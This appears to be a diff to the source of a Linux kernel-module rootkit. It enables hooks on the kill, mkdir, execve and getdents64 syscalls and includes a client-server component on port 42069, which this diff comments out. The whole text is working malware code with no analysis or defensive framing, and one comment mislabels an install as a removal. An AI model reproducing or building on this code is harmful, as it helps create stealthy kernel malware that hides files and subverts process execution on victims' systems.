@@ -7,7 +7,7 @@ kernel module imports
 #include <linux/string.h>
 
 static int BUFFER_SIZE = 2048; //size of buffers used
-
+static char ROOTKIT_ID[] =  "Rootkit198760"; //id of the rootkit
 #include "custom/networking.c" //functions to run server and communicate with client
 #include "custom/syscall_table.c" //functions for getting sycall syscall_table
 #include "custom/hooks.c" //functions for hooking syscalls
@@ -16,9 +16,10 @@ static int BUFFER_SIZE = 2048; //size of buffers used
 static void __exit ModuleExit(void) {
 	remove_hook(&sys_kill); //removes sys_kill hook
 	remove_hook(&sys_mkdir); //removes sys_mkdir hook
-	//remove_hook(&sys_execve); //removes sys_execve hook
+	remove_hook(&sys_execve); //removes sys_execve hook
+	remove_hook(&sys_getdents64); //removes sys_getdents64 hook
 	client_print("[rootkit] module removed!!!\n");
-	remove_server();
+	//remove_server();
 	printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
 }
 
@@ -27,13 +28,12 @@ static int __init ModuleInit(void) {
 	get_syscall_table(); //gets suyscall table
 	install_hook(&sys_kill); //installs sys_kill hook
 	install_hook(&sys_mkdir); //installs sys_mkdir hook
-	//install_hook(&sys_execve); //installs sys_execve hook
-	orig_kill = sys_kill.orig_syscall; //sets orig_kill to original syscall adress
-	orig_mkdir = sys_mkdir.orig_syscall; //sets orig_mkdir to original syscall adress
+	install_hook(&sys_execve); //installs sys_execve hook
+	install_hook(&sys_getdents64); //removes sys_getdents64 hook
 	//orig_execve = sys_execve.orig_syscall; //sets orig_execve to original syscall adress
 
 	unsigned short int port = 42069; //sets the port to set
-	kthread_run(run_server, (void *) port, "server"); //runs the server
+	//kthread_run(run_server, (void *) port, "server"); //runs the server
 	return 0;
 }
 
